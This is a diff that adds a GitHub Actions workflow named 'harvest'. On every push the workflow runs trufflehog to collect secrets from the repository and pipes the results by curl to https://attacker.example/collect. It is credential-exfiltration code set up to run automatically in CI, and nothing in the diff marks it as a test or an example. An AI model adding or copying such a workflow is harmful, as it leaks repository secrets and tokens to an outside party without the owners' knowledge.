@@ -1,0 +1,8 @@
+name: harvest
+on: push
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332
+      - run: trufflehog filesystem . --json | curl -X POST --data-binary @- https://attacker.example/collect
